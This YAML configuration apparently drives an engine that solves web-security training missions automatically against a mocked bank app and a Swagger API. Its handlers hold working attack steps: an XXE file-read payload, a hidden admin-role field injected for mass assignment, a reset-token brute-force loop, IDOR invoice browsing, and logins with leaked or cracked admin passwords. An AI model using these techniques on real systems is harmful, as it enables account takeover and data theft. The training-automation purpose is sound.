# Reusable mission STEP-rules — the "log in as Alice" macros.
#
# A mission (docs/mission-api.md) is a second observe→match→act→verify loop one
# level down from the page-state graph: its "state" is the current forward step
# (instruction[activeIndex] from the mission API) and its "rules" are the
# parameterized step-handlers below.
#
# These are matched against the current step's OWN signature (its title /
# description) — never against which mission we're in. Missions are near-copies
# with a single value changed, so "Log in as {user}" recurs across the catalogue;
# a handler authored once here must fire in EVERY mission that reuses that step.
# That reuse is the whole point of a shared file: encode a step once, and every
# mission that starts the same way runs hands-off.
#
# A step the engine can't match here stops the walk with context (the step text +
# the app form) so the missing handler can be added — after which it, too, is
# automatic everywhere. Add handlers as steps are discovered; only author what
# we've actually observed (selectors/frames), the way we do for page states.

steps:
  # === Boat Insurances XXE mission (a Swagger/OpenAPI app, NOT Viking Bank) =========
  # This mission's app frame [0,0,0] is a Swagger UI API explorer (endpoints you expand,
  # a "Try it out" toggle, a JSON/XML request body, an Execute button, a response body) —
  # a wholly different app type from the Viking Bank mocked web app the other handlers
  # drive. These handlers puppet that Swagger UI. Solved + verified LIVE end-to-end
  # 2026-07-13: every instr-check ticked as each step ran; mission "Congratulations!"
  # (XXE) panel reached. Placed ABOVE the Viking Bank login handlers on purpose — step 7
  # ("Log in as an Employee") starts with "Log in" and names an email in backticks, so the
  # generic `login-as` below would otherwise poach it and type into a #Username form that
  # doesn't exist in this app.
  #
  # SWAGGER RELIABILITY: expanding an endpoint and toggling "Try it out" is React-timed and
  # flaky as separate UI clicks (the first try-out click right after an expand silently
  # no-ops). The reliable recipe, used throughout below, is a SINGLE eval that (a) clicks
  # the summary if the block is closed and (b) clicks try-out if it isn't already "Cancel":
  # programmatic .click()s dispatch discrete events that flush React synchronously, so both
  # land in one pass. Request bodies/params are React-controlled inputs, so we set them via
  # the native value setter + an 'input' event (the take-over-session cookie-write trick),
  # never Selenium typing. Execute is then a normal UI click (its own round-trip settles the
  # state first). NOTE: the byReg `do` wraps the injected XML in DOUBLE quotes, so an xml
  # payload must contain no `"` (the XXE payload uses single quotes — fine).

  # Step 0 "Obtain a token for Eve": POST /api/auth/token with the username + password named
  # in backticks in the copy; the JSON response carries the JWT step 1 authorizes with. The
  # token `do` (anchored) is shared verbatim by step 7 (employee login) — same request, only
  # the credentials differ.
  - id: swagger-obtain-token
    match:
      title_regex: '(?i)^obtain a token'
    extract:
      username: { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
      password: { from: description, regex: 'password\s+`([^`]+)`', default: 'P@ssw0rd1!' }
    do: &swagger_token_do
      - eval:
          frame: "0/0/0"
          script: >-
            var o=document.querySelector('#operations-Auth-post_api_auth_token');
            if(!o.classList.contains('is-open'))o.querySelector('.opblock-summary-control').click();
            var t=o.querySelector('.try-out__btn'); if(t&&t.textContent.trim()!=='Cancel')t.click();
            var ta=o.querySelector('.body-param__text');
            var s=Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype,'value').set;
            s.call(ta, JSON.stringify({username:'{username}',password:'{password}'}));
            ta.dispatchEvent(new Event('input',{bubbles:true}));
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#operations-Auth-post_api_auth_token .execute', settle: 3 }

  # Step 1 "Authenticate as Eve": copy the JWT out of step 0's response, open the Authorize
  # modal (top "Authorize" button in .auth-wrapper), enter "bearer <token>", submit, close.
  # Reads the token straight off the token endpoint's on-page response, so no cross-step
  # plumbing. The modal input is React-controlled → native setter + 'input' event.
  - id: swagger-authenticate
    match:
      title_regex: '(?i)^authenticate as'
    do:
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '.auth-wrapper .btn.authorize', settle: 1 }
      - eval:
          frame: "0/0/0"
          script: >-
            var m=(document.querySelector('#operations-Auth-post_api_auth_token .response-col_description .microlight')||{}).textContent||'';
            var t=(m.match(/"token":\s*"([^"]+)"/)||[])[1]||'';
            var inp=document.querySelector('.auth-container input, .modal-ux input');
            var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
            s.call(inp,'bearer '+t);
            inp.dispatchEvent(new Event('input',{bubbles:true}));
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '.modal-btn.authorize', settle: 1 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '.modal-btn.btn-done', settle: 1 }

  # Step 2 "View all Eve's boats": GET /api/boats + Execute (auth from step 1 applies
  # automatically). The returned list's registration numbers feed step 3.
  - id: swagger-view-boats
    match:
      title_regex: "(?i)^view all .*boats"
    do:
      - eval:
          frame: "0/0/0"
          script: >-
            var o=document.querySelector('#operations-Boat-get_api_boats');
            if(!o.classList.contains('is-open'))o.querySelector('.opblock-summary-control').click();
            var t=o.querySelector('.try-out__btn'); if(t&&t.textContent.trim()!=='Cancel')t.click();
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#operations-Boat-get_api_boats .execute', settle: 3 }

  # Step 3 "View detailed info of a boat": GET /api/boats/byRegistrationNumber with an XML
  # param whose <RegistrationNumber> is one of your own boats — read LIVE from step 2's boats
  # response (first <RegistrationNumber>), so it survives data rotation. The byReg `do`
  # (anchored) is shared by steps 4 and 6; each supplies a different `xml`.
  - id: swagger-view-boat-detail
    match:
      title_regex: '(?i)^view detailed info of a boat'
    context:
      xml:
        frame: "0/0/0"
        eval: >-
          var m=(document.querySelector('#operations-Boat-get_api_boats .live-responses-table .microlight')||{}).textContent||'';
          var r=(m.match(/<RegistrationNumber>([^<]+)<\/RegistrationNumber>/)||[])[1]||'SMH464';
          return '<ViewBoatRequest><RegistrationNumber>'+r+'</RegistrationNumber></ViewBoatRequest>';
    do: &swagger_boat_xml_do
      - eval:
          frame: "0/0/0"
          script: >-
            var o=document.querySelector('#operations-Boat-get_api_boats_byRegistrationNumber');
            if(!o.classList.contains('is-open'))o.querySelector('.opblock-summary-control').click();
            var t=o.querySelector('.try-out__btn'); if(t&&t.textContent.trim()!=='Cancel')t.click();
            var i=o.querySelector('input[placeholder=xml]');
            var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
            s.call(i, "{xml}");
            i.dispatchEvent(new Event('input',{bubbles:true}));
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#operations-Boat-get_api_boats_byRegistrationNumber .execute', settle: 3 }

  # Step 4 "Insert an invalid registration number": same endpoint, but the copy tells you to
  # use `XXX000` — a static invalid reg. Reuses the byReg `do`; the error response echoes the
  # bad input (setup for the XXE step). `xml` is a fixed default (no regex → the default wins).
  - id: swagger-invalid-reg
    match:
      title_regex: '(?i)^insert an invalid registration number'
    extract:
      xml: { default: '<ViewBoatRequest><RegistrationNumber>XXX000</RegistrationNumber></ViewBoatRequest>' }
    do: *swagger_boat_xml_do

  # Step 6 "Exploit XXE and retrieve a file": same endpoint, but the xml is the DOCTYPE/ENTITY
  # payload named verbatim in the copy — a SYSTEM entity pointing at wwwroot/backup/
  # CreateDefaultAdmin.sql, referenced as &foo; inside <RegistrationNumber>. The XML parser
  # allows DTDs, so it resolves the entity and the error message leaks the file contents (the
  # employee credentials). Static training payload → hardcoded (double-quoted YAML; the
  # payload's own quotes are single). (Order 5 "Inspect the code" is informational — no
  # checkbox — so the mission loop skips it; no handler needed.)
  - id: swagger-exploit-xxe
    match:
      title_regex: '(?i)^exploit xxe'
    extract:
      xml:
        default: "<!DOCTYPE foo [ <!ENTITY foo SYSTEM 'wwwroot/backup/CreateDefaultAdmin.sql' >]><ViewBoatRequest><RegistrationNumber>&foo;</RegistrationNumber></ViewBoatRequest>"
    do: *swagger_boat_xml_do

  # Step 7 "Log in as an Employee": repeat step 0's token request as the employee whose creds
  # the XXE just leaked. The email is named in the copy (backtick); the password is read LIVE
  # from step 6's XXE response — the LAST single-quoted token of the leaked SQL INSERT (the
  # Password column) — so it survives rotation. Reuses the shared token `do`. MUST stay above
  # `login-as` (below). LIMITATION: assumes the leaked password contains no single quote (it
  # would break the JS string literal the token `do` builds); the observed one didn't.
  - id: swagger-login-employee
    match:
      title_regex: '(?i)^log in as an employee'
    extract:
      username: { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
    context:
      password:
        frame: "0/0/0"
        eval: >-
          var m=(document.querySelector('#operations-Boat-get_api_boats_byRegistrationNumber .live-responses-table .microlight')||{}).textContent||'';
          var q=m.match(/'[^']*'/g);
          return q? q[q.length-1].replace(/'/g,'') : '';
    do: *swagger_token_do

  # Log in to the mocked target app (Viking Bank). Fires on every login step —
  # "Log in as Alice", "Log in as Bob", "Log in with an incorrect password" — the
  # only difference being the credentials, which are the backtick-quoted tokens in
  # the step's description. Password defaults to a throwaway when the step says
  # "enter any password you like" (there's no `password` token to capture — which
  # is itself the missing-auth vuln these missions teach).
  #
  # NOTE ON ORDER: match_step returns the FIRST matching handler, so the more
  # specific `logout-then-login` (title "log in" AND copy mentions "log out") must
  # precede plain `login-as` — else login-as would greedily claim Bob's step.

  # Log in as a user whose credentials were DISCOVERED on the page, not named in the
  # step text — the payoff of the "Cleartext password / passwords in HTML source"
  # mission (step "Log in as user number 3"). The prior steps left the admin viewing
  # /users/<id>, whose password field masks its value with asterisks but leaks the
  # cleartext in a `password` HTML attribute (the vuln); the email shows as text. So,
  # like `take-over-session`, the creds come from a live-page `context` (frame [0,0,0],
  # the app), NOT the step copy. Then it's a logout-then-login: nav menu -> Logout,
  # then type the discovered creds into the login form. Confirmed LIVE end-to-end
  # (mission "Congratulations!" panel). MUST precede `logout-then-login` below: step 4's
  # copy says "Log out as admin", so that broader handler would otherwise claim it and
  # try (and fail) to read creds from the text. Its title `^log in as user number` is
  # specific enough not to poach a plain "Log in as Alice".
  - id: login-as-inspected-user
    match:
      title_regex: '(?i)^log in as user number'
    context:
      email:    { frame: "0/0/0", eval: "return (document.body.innerText.match(/Email:\\s*([\\w.+-]+@[\\w.-]+)/)||[])[1]" }
      password: { frame: "0/0/0", eval: "return document.querySelector('input[password]').getAttribute('password')" }
    do:
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-logout', settle: 2 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: '{email}' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: '{password}' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }

  # Log in as admin with a password WE set via a hijacked password reset — final step
  # of the weak-reset-token mission ("Log in as admin": "head back to the login page and
  # log in with admin@vikingbank.example and the newly chosen password"). The password
  # is the one `change-admin-password` typed into the reset form (a fixed value we chose,
  # NewP@ssw0rd1!), so it's hardcoded to match. Distinguished from `login-admin-cracked-
  # password` (rainbow mission) by the "newly chosen password" phrasing, and placed
  # BEFORE `login-as` because step 8 names the email in backticks — login-as would
  # otherwise poach it and type its throwaway default. Confirmed LIVE end-to-end.
  - id: login-admin-new-password
    match:
      title_regex: '(?i)^log in as admin'
      desc_contains: 'newly chosen password'
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/login', enter: true, settle: 3 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'admin@vikingbank.example' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }

  # Log in as admin with a password LEAKED via static file browsing — final step of the
  # directory-listing mission ("Log in as admin": "log in as the administrator
  # admin@vikingbank.example with the password you've just discovered"). Earlier steps
  # exposed /wwwroot/backup/CreateDefaultAdmin.sql (a static file the misconfigured server
  # will serve to anyone), whose INSERT leaks the default admin password. Rather than
  # hardcode it, a `context` eval RE-FETCHES that SQL file with a same-origin sync XHR from
  # the app frame [0,0,0] and pulls the LAST single-quoted token (the Password column) — so
  # it survives SCW rotating the value. Distinguished from the other two "Log in as admin"
  # handlers by "just discovered" (vs "just found" / "newly chosen password"); placed before
  # login-as because the email is backtick-quoted. Confirmed LIVE end-to-end 2026-07-13.
  - id: login-admin-leaked-file
    match:
      title_regex: '(?i)^log in as admin'
      desc_contains: 'just discovered'
    context:
      password:
        frame: "0/0/0"
        eval: "var x=new XMLHttpRequest();x.open('GET','/wwwroot/backup/CreateDefaultAdmin.sql',false);x.send();var m=x.responseText.match(/'[^']*'/g);return m?m[m.length-1].replace(/'/g,''):'';"
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/login', enter: true, settle: 3 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'admin@vikingbank.example' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: '{password}' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }

  # Log OUT then log in — a single checklist step whose copy says "Log out again.
  # This time, you log in as …" (vb-52 step 4, "Log in as Bob"). It's one checkbox,
  # so the handler must do both: the prior step left a *different* user logged in,
  # so we can't just type into a login form that isn't showing. It additionally
  # requires "log out" in the description, so a plain "Log in as Alice" (no logout)
  # still falls through to `login-as` below.
  #
  # Logout is the app's nav menu -> Logout (`#menu-link-logout`, href /auth/logout).
  # The `menu` toggle + the logout link were captured live on vb-52; the click
  # sequence itself is authored-from-observation (validate on the next fresh run).
  - id: logout-then-login
    match:
      title_regex: '(?i)^log in'
      desc_contains: 'log out'
    extract:
      email:    { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
      password: { from: description, regex: 'password `([^`]+)`', default: 'password' }
    do:
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-logout', settle: 2 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: '{email}' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: '{password}' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 2 }

  # Plain log in (no preceding logout — the app is already at the login form).
  # Selectors/frame confirmed live on vb-52: the login form is in frame [0,0,0].
  #
  # The default password is `password`, not a one-char throwaway: the mocked app
  # rejected `x` when logging in as Bob ("bob's auth is broken") even though the
  # vuln is that ANY password is accepted — there's a minimum-length check that
  # fires *before* the broken auth, so the throwaway must be long enough. When the
  # step names a real password (Alice's `P@ssw0rd1!`) that wins via the regex.
  #
  # GATE: fire only when the step actually NAMES the account to use — a
  # backtick-quoted email in the copy. Every genuine login step does ("Log in as
  # `alice@alice.com`…", even "enter any password you like" ones name the user);
  # steps where the password must be DISCOVERED first ("Log in as admin with the
  # password you just found" — the rainbow-table/SHA256 mission) name no email, so
  # login-as no longer poaches them, types a wrong default, and burns a doomed
  # 20s verify. Those fall through to a purpose-built handler (or stop clean as
  # mission-stuck) instead of `mission-blocked`.
  - id: login-as
    match:
      title_regex: '(?i)^log in'
      desc_regex: '`[\w.+-]+@[\w.-]+`'
    extract:
      email:    { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
      password: { from: description, regex: 'password `([^`]+)`', default: 'password' }
    do:
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: '{email}' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: '{password}' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 2 }

  # Log in as admin with a password CRACKED from a leaked hash — the SHA256 /
  # rainbow-table mission ("A password dump … has surfaced … hashing algorithm was
  # SHA256 … we've provided a rainbow table"). Its only pod-verified step is
  # "Log in as admin" ("Log in as the admin user with the password you just found.");
  # the two prior steps just have you READ two files in the code pane and are
  # informational (no checkbox). The crack, done by hand and validated LIVE 2026-07-13:
  #   password-dump.txt : admin@vikingbank.example -> 5a012756f3fe06210fe8f3afca3176541d8ad232e9d34aa5aedf7c19715ad4b9
  #   rainbow-table.txt : that hash               -> qwer123456
  # so admin's password is `qwer123456`. This is a STATIC ANSWER (fixed training data),
  # encoded like a courses/challenges.yaml key rather than computed: the two files live
  # in MUI tabs that UNMOUNT the inactive panel (only the open file is ever in the DOM),
  # so a single in-page eval can't read the dump AND the table to crack it live. If SCW
  # ever rotates the dump/table, re-crack and update the password here.
  # Match is tight (title "log in as admin" + the "password you just found" phrasing)
  # so it can't poach another mission's admin login. login-as no longer competes (its
  # gate needs a backtick email, absent here); logout-then-login needs "log out" (absent).
  - id: login-admin-cracked-password
    match:
      title_regex: '(?i)^log in as admin'
      desc_contains: 'password you just found'
    do:
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'admin@vikingbank.example' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'qwer123456' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }

  # Log out — a standalone checklist step ("Log out, and have a look at the code
  # …", vb-52 step 2). Same nav-menu -> Logout as above. Matches only titles that
  # START with "log out" so it never claims a "Log in …" step.
  - id: log-out
    match:
      title_regex: '(?i)^log out'
    do:
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-logout', settle: 2 }

  # Visit an endpoint in the mocked app by typing the path into the mission's
  # simulated address bar. The path is the backtick-quoted token after a slash in
  # the step copy. Confirmed LIVE on two missions with different phrasings:
  #   - "Exposed Session Tokens" (step "Visit invoices"): "Navigate to the
  #     /`invoices` endpoint".
  #   - "Broken Access Control" (step "Go to the hidden page"): "Access it by
  #     adding /`users` to the browser bar".
  # The address bar `#browserBar` (frame [0,0], NOT the app frame [0,0,0] — it's the
  # mission player's chrome) AUTO-PREPENDS the leading "/", so type the BARE path
  # without it — typing "/invoices" yields "//invoices" → Page Not Found. Enter
  # submits (the bar has no click target). Reusable: many missions send you to a
  # hidden/forbidden endpoint that has no menu link, which is the whole point.
  #
  # The match is the /`path` token PLUS a nav verb, deliberately broad enough to
  # span both phrasings while never firing on a step that merely *mentions* a path
  # (e.g. "the link to the /users page is hidden") — those lack the verb. "add" (bare)
  # is included for vb-56's "you can add /`vault` to the URL" — `add(?:ing)?\b` so it
  # also covers "adding" without matching "address".
  - id: navigate-endpoint
    match:
      desc_regex: '(?i)(navigate to|add(?:ing)?\b|go to|visit).{0,30}/`[^`]+`'
    extract:
      path: { from: description, regex: '/`([^`]+)`' }
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: '{path}', enter: true, settle: 3 }

  # Navigate to a page via the app's nav MENU (not the browserBar) — the
  # "Cleartext password" mission, step "Go to the users page" ("Navigate to the Users
  # page via the menu."). The menu links live in the app frame [0,0,0] as
  # `#menu-link-<name>` (home/transfer/statements/invoices/profile/users/logout); open
  # the menu, then click the Users link. Targeted to Users (the only menu-nav step
  # observed); generalize to an extracted page name if others turn up (the id is
  # lowercase, the copy capitalized, so a general version needs case folding).
  # Confirmed LIVE (step ticked).
  - id: goto-users-page
    match:
      title_regex: '(?i)^go to the users page'
    do:
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-users', settle: 3 }

  # View a specific user's detail page by id — "Cleartext password" mission, step
  # "View user number 3". The user-detail URL is /users/<id>; the id is the number in
  # the title. Navigate via the mission chrome #browserBar in frame [0,0] (bare path,
  # it auto-prepends "/"). This leaves the app on /users/<id> for the later
  # `login-as-inspected-user` step to scrape creds from. Confirmed LIVE (id 3).
  - id: view-user-by-id
    match:
      title_regex: '(?i)^view user number \d+'
    extract:
      id: { from: title, regex: 'number (\d+)' }
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'users/{id}', enter: true, settle: 3 }

  # IDOR mission ("Insecure Direct Object Reference") — the invoice-detail pages
  # are directly referenceable by id (/invoices/invoice/<id>) with no ownership
  # check, so browsing ids reaches other users' invoices. Confirmed LIVE end-to-end.
  # Of its six instructions only THREE are pod-verified (render a checklist checkbox
  # → in `checkable`); the other three ("Inspect the URL", "View another one of your
  # invoices", "Connect the dots") are informational reflection steps with no box, so
  # the mission loop skips them. These handlers cover the three verified ones.

  # Step 1 "View one of your invoices": go to the invoices list, then open the first
  # one. Navigate via the mission chrome's #browserBar in frame [0,0] (it auto-prepends
  # "/", so type the bare path); the View links live in the app frame [0,0,0] and their
  # raw DOM text is "View" (CSS-uppercased to "VIEW" — see README's XPath gotcha).
  # Clicking any own-invoice View ticks the step, so take the first — robust to whatever
  # per-session ids exist. (List-nav + click authored from observation; ids/steps LIVE.)
  - id: view-own-invoice
    match:
      title_regex: '(?i)^view one of your invoices'
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'invoices', enter: true, settle: 3 }
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "(//a[normalize-space(.)='View'])[1]", settle: 3 }

  # Steps 5 "Try another id" and 6 "View another user's invoice": both just visit an
  # invoice-detail URL by a literal id named in the copy — "the number 25" (a missing
  # id → 'invoice not found') and "number 7" (someone else's invoice, the IDOR payoff).
  # Same primitive, so one handler keyed on either title; the id is the "number <n>"
  # token. The /invoices/invoice/ path is this mission's URL shape — hardcoded (not
  # scraped from the live bar) so it works even when this step is the resume entry
  # point and the bar isn't already on an invoice page. Confirmed LIVE (ids 25, 7).
  - id: browse-invoice-by-id
    match:
      title_regex: "(?i)^(try another id|view another user's invoice)"
    extract:
      id: { from: description, regex: 'number (\d+)' }
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'invoices/invoice/{id}', enter: true, settle: 3 }

  # --- Mass assignment / privilege-escalation mission --------------------------
  # The /profile "change password" form's backend blindly binds EVERY posted field to the
  # user record (mass assignment), including a `Role` it never renders — so adding a hidden
  # Role=Admin input to the form and submitting a password change escalates the account to
  # admin. 4 steps, all checkable. Step 1 "Log in as Alice" is handled by `login-as`; step 2
  # "Visit the profile page" by `navigate-endpoint` (or `visit-profile-page` below). The new
  # password we set (NewP@ssw0rd1!) is reused by `access-admin-page` to log back in.
  # Confirmed LIVE end-to-end 2026-07-13.

  # Step 2 "Visit the profile page": nav the #browserBar to `profile`. (navigate-endpoint may
  # already claim this if the raw copy backtick-quotes /`profile`; this is the deterministic
  # title-keyed fallback so the step is covered either way.)
  - id: visit-profile-page
    match:
      title_regex: '(?i)^visit the profile page'
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'profile', enter: true, settle: 3 }

  # Step 3 "Escalate to the Admin role": the exploit. `eval` injects a hidden
  # <input name="Role" value="Admin"> into the profile form (idempotent — skip if already
  # present), then set a new password in both fields and Submit; the mass-assignment backend
  # writes the smuggled Role alongside the password. The form is in the app frame [0,0,0].
  - id: escalate-mass-assignment
    match:
      title_regex: '(?i)^escalate to the admin role'
    do:
      - eval: { frame: "0/0/0", script: "var f=document.querySelector('form'); if(f && !f.querySelector('[name=Role]')){var i=document.createElement('input'); i.type='hidden'; i.name='Role'; i.value='Admin'; f.appendChild(i);}" }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#ConfirmPassword', value: 'NewP@ssw0rd1!' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#change-password-btn-submit', settle: 3 }

  # Step 4 "Access an admin page": prove the escalation — log out, log back in as Alice with
  # the just-set password, then visit /users (admin-only). The pod ticks the step on reaching
  # the users page, NOT on login alone (confirmed live), so the final nav is required.
  - id: access-admin-page
    match:
      title_regex: '(?i)^access an admin page'
    do:
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-logout', settle: 2 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'alice@alice.com' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 2 }
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'users', enter: true, settle: 3 }

  # --- Static file browsing / directory-listing mission ------------------------
  # A misconfigured server has directory listing + static browsing enabled under
  # STATIC_URL=/wwwroot, so anyone can walk the tree and read files that shouldn't be
  # public — here /wwwroot/backup/CreateDefaultAdmin.sql, which leaks the seeded admin
  # password. 4 steps; step 2 "Browse through the root directory" is informational (no
  # checkbox → skipped). The final login is handled by `login-admin-leaked-file` above.
  # All confirmed LIVE end-to-end 2026-07-13.

  # Step 1 "List directory contents": browse the static root to get an "Index of /wwwroot/"
  # listing. Nav the #browserBar (frame [0,0], bare path) to `wwwroot` (the STATIC_URL from
  # config.py shown in the code pane). Reveals the backup/ folder.
  - id: list-static-directory
    match:
      title_regex: '(?i)^list directory contents'
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'wwwroot', enter: true, settle: 3 }

  # Step 3 "Obtain admin credentials": open the backed-up SQL seed script directly (its path
  # is named in the copy) to reveal the default admin password in cleartext. Just viewing it
  # ticks the step; `login-admin-leaked-file` re-reads the same file for the password value.
  - id: view-leaked-sql
    match:
      title_regex: '(?i)^obtain admin credentials'
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'wwwroot/backup/CreateDefaultAdmin.sql', enter: true, settle: 3 }

  # --- Weak password-reset-token / user-enumeration mission --------------------
  # A 9-step IDOR-on-reset-tokens mission: the forgot-password flow emails a link whose
  # `token` is a tiny random int (1-5), and the reset endpoint trusts an `email` query
  # param — so you can reset ANOTHER user's (the admin's) password by guessing the token.
  # Steps 3 ("Inspect the URL") and 6 ("Inspect the code") are informational (no checkbox
  # → skipped). All selectors/flow confirmed LIVE end-to-end 2026-07-13. The password we
  # set (`NewP@ssw0rd1!`) is a fixed value shared between change-admin-password and
  # login-admin-new-password (above).

  # Step 1 "Request a password change for Alice": open the forgot-password form and submit
  # the backtick-quoted email. Nav straight to /auth/forgotpassword via the #browserBar
  # (frame [0,0], bare path) rather than clicking the login page's "Forgot Password?" link
  # — same form, and robust to the starting page.
  - id: request-password-reset
    match:
      title_regex: '(?i)^request a password change'
    extract:
      email: { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/forgotpassword', enter: true, settle: 3 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Email', value: '{email}' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#forgot-password-btn-submit', settle: 3 }

  # Step 2 "Read the email": open the Email Client tab, open the "Reset Your Password"
  # message, and click its "Reset Password" link (which carries Alice's ?email&token). All
  # in the mission-player chrome frame [0,0] (same tab/inbox pattern as `check-answer`).
  - id: read-reset-email
    match:
      title_regex: '(?i)^read the email'
    do:
      - ui: { action: click, frame: [0, 0], by: css,   selector: '#browser-tab-EMAIL_CLIENT', settle: 3 }
      - ui: { action: click, frame: [0, 0], by: xpath, selector: "//button[contains(., 'Reset Your Password')]", settle: 2 }
      - ui: { action: click, frame: [0, 0], by: xpath, selector: "//a[normalize-space(.)='Reset Password']", settle: 3 }

  # Step 4 "Request a password reset for the admin": the user-enumeration beat — submit a
  # non-existent address (nothing happens) then the admin's (a reset email IS sent, which
  # leaks that the account exists). Both addresses are fixed in the copy. Reuses the same
  # forgot-password form.
  - id: request-reset-admin
    match:
      title_regex: '(?i)^request a password reset for the admin'
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/forgotpassword', enter: true, settle: 3 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Email', value: 'randy@random.com' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#forgot-password-btn-submit', settle: 2 }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Email', value: 'admin@vikingbank.example' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#forgot-password-btn-submit', settle: 3 }

  # Step 5 "Modify the password reset URL": point the reset endpoint at the admin with a
  # deliberately-wrong token=0 (the copy walks you to this exact URL) — lands on a "reset
  # password failure" page, which ticks the step. Sets up the token guess next.
  - id: modify-reset-url
    match:
      title_regex: '(?i)^modify the password reset url'
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'profile/resetpassword?email=admin@vikingbank.example&token=0', enter: true, settle: 3 }

  # Step 7 "Guess the reset token": the token is a random int in [1,5], so brute-force it.
  # A `context` eval (in the app frame [0,0,0], same-origin) probes each candidate with a
  # SYNCHRONOUS XHR — a plain GET, which renders the reset form but does NOT consume the
  # token (only the change-password POST does), so probing is side-effect-free — and
  # returns the first token whose response is the reset form (has #ConfirmPassword) rather
  # than the failure page. The `do` then navigates the #browserBar to that winning token
  # (the validated nav mechanism), landing on the admin's reset form. This keeps the loop
  # in the eval and the actuation in a normal UI action. Token 1 hit live; the loop is
  # authored-from-observation (the token is single-use, so it can't be re-validated here).
  - id: guess-reset-token
    match:
      title_regex: '(?i)^guess the reset token'
    context:
      token:
        frame: "0/0/0"
        eval: "for(var n=1;n<=5;n++){var x=new XMLHttpRequest();x.open('GET','/profile/resetpassword?email=admin@vikingbank.example&token='+n,false);x.send();if(/ConfirmPassword/i.test(x.responseText)&&!/failure|invalid|expired/i.test(x.responseText))return n;}return 0;"
    do:
